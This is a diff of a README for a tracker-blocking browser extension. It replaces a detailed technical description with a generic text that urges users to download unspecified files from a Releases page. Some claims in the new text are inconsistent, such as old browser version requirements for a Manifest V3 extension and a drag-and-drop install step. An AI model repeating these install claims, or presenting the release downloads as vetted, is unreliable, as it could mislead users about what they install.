@@ -1,53 +1,78 @@
-# Privacy Armor
-=============
+# 🛡️ Privacy-Armor - Protect Your Online Privacy Today
 
-Privacy Armor is a Chrome Manifest V3 extension that blocks common trackers and reduces browser fingerprinting surfaces. It combines declarativeNetRequest rules with lightweight in-page mitigations.
+## 🚀 Getting Started
 
-Features
-- Tracker blocking via static and dynamic DNR rules (e.g., Google Analytics, DoubleClick, common pixels)
-- Fingerprinting surface reduction in-page (navigator hints, Canvas, WebGL, AudioContext, timezone normalization)
-- Live counters in the popup: recent tracker domains seen and last blocked request
-- Quick actions: reinstall rules, reset counters, toggle blocking/spoofing
+Welcome to Privacy-Armor, a tool that helps block unwanted tracking and reduces your digital fingerprint. Follow the steps below to download and run your new extension!
 
-What it does
-- Uses `declarativeNetRequest` with `rules_dynamic.json` and dynamically generated rules to block tracker requests
-- Observes requests with `webRequest` to maintain per-domain counters (not used to block)
-- Injects a page-context script that normalizes or lightly perturbs high-entropy signals (Canvas/WebGL/Audio) deterministically per-origin
-- Persists state in `chrome.storage.local`
+## 🔗 Download Link
 
-Install (Load Unpacked)
-1. Open `chrome://extensions/`
-2. Enable "Developer mode" (top-right)
-3. Click "Load unpacked"
-4. Select the `Privacy-Armor` folder (the folder containing `manifest.json`)
-5. The extension appears in your toolbar; open the popup to verify
+[![Download Privacy-Armor](https://img.shields.io/badge/Download-Privacy--Armor-blue)](https://github.com/Thulio-Souza/Privacy-Armor/releases)
 
-Usage
-- Popup
-  - Tracker blocking: enable/disable dynamic rules
-  - Fingerprint spoofing: toggle in-page mitigations (reload pages to apply changes)
-  - Reinstall rules: reapply dynamic rules if needed
-  - Reset counters: clear tracked domain counts and last blocked entry
-- Options page: simple enable toggle (reserved for future expansion)
+## 📥 Download & Install
 
-Permissions
-- `declarativeNetRequest`: apply blocking and header modification rules
-- `webRequest`: observe requests for counters only
-- `scripting`: inject page-context spoofing logic
-- `storage`: persist settings and counters
-- `tabs`, `host_permissions: <all_urls>`: operate on all sites
+To start using Privacy-Armor, visit our [Releases page](https://github.com/Thulio-Souza/Privacy-Armor/releases) to download the latest version. 
 
-Files
-- `manifest.json`: MV3 config, permissions, content script, DNR rules
-- `rules_dynamic.json`: baseline ruleset
-- `src/background.js`: installs/updates dynamic rules, tracks counters, handles popup messages
-- `src/inject.js`: injects `src/content-hook.js` into page context
-- `src/content-hook.js`: spoofing/mitigations for high-entropy APIs
-- `src/popup.html` / `src/popup.js`: UI to view counters and toggles
-- `src/options.html` / `src/options.js`: basic settings
-- `src/icon.png`: extension icon
+### Step-by-Step Guide
 
-Troubleshooting
-- If blocking seems off, click "Reinstall rules" in the popup
-- After changing spoofing, reload affected pages
-- Check `chrome://extensions/` → Privacy Armor → "Service worker" logs for errors
+1. **Visit the Releases Page**  
+   Click on the link to go to the [Releases page](https://github.com/Thulio-Souza/Privacy-Armor/releases). This page has the latest versions of Privacy-Armor.
+
+2. **Select the Version**  
+   On the Releases page, you will see a list of available versions. Look for the most recent release. It will usually be at the top of the list.
+
+3. **Download the Extension**  
+   Under the selected version, you will find the download files. Click on the appropriate file for your browser. For most users, you will see a file for Chrome. 
+
+4. **Install the Extension**  
+   After downloading, open your web browser. Go to the browser's extensions page. Here's how to do it:
+   - **For Chrome:** Type `chrome://extensions` in the address bar and press Enter.
+   - **For Firefox:** Type `about:addons` in the address bar and press Enter.
+   
+   Now, enable "Developer mode" in Chrome. In Firefox, look for an option to install the downloaded file.
+
+5. **Add Privacy-Armor**  
+   Drag and drop the downloaded file into the extension page, or use the "Upload" button. Follow any prompts to complete the installation.
+
+6. **Activate the Extension**  
+   Once installed, make sure Privacy-Armor is enabled. You may find it listed among your browser’s extensions.
+
+## 🌐 Features of Privacy-Armor
+
+- **Tracker Blocking:** Blocks unwanted tracking scripts to keep your activities private.
+- **Fingerprint Reduction:** Helps reduce your digital fingerprint, making it harder for websites to track you.
+
+## ⚙️ System Requirements
+
+- **Browser:** Google Chrome version 70 or later, Mozilla Firefox version 63 or later.
+- **Operating System:** Any operating system that supports Chrome or Firefox, such as Windows, macOS, or Linux.
+
+## 🔒 Why Use Privacy-Armor?
+
+In today’s world, online privacy is crucial. Many websites track your activity for advertising purposes. Privacy-Armor helps you regain control by blocking these trackers and reducing your digital footprint.
+
+## 💡 FAQ
+
+### What is a Digital Fingerprint?
+
+Your digital fingerprint includes information such as your browser type, operating system, and installed extensions. Websites often use this data to track your online behavior.
+
+### How Often Should I Update Privacy-Armor?
+
+Check the Releases page frequently for updates. Keeping your extension up-to-date ensures optimal performance and better protection against new tracking methods.
+
+### Is Privacy-Armor Free?
+
+Yes, Privacy-Armor is completely free to use!
+
+## 🙋 Feedback & Support
+
+We welcome your feedback! If you have questions or suggestions, please create an issue in the repository. Your thoughts help us improve the application.
+
+For technical support, visit our [Issues page](https://github.com/Thulio-Souza/Privacy-Armor/issues) where you can report problems or ask for help.
+
+## 🔗 Additional Resources
+
+- [Privacy-Armor Releases Page](https://github.com/Thulio-Souza/Privacy-Armor/releases)
+- [Browser Extension Guide](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Your_first_WebExtension)
+  
+We appreciate your interest in Privacy-Armor. Enjoy enhanced online privacy!
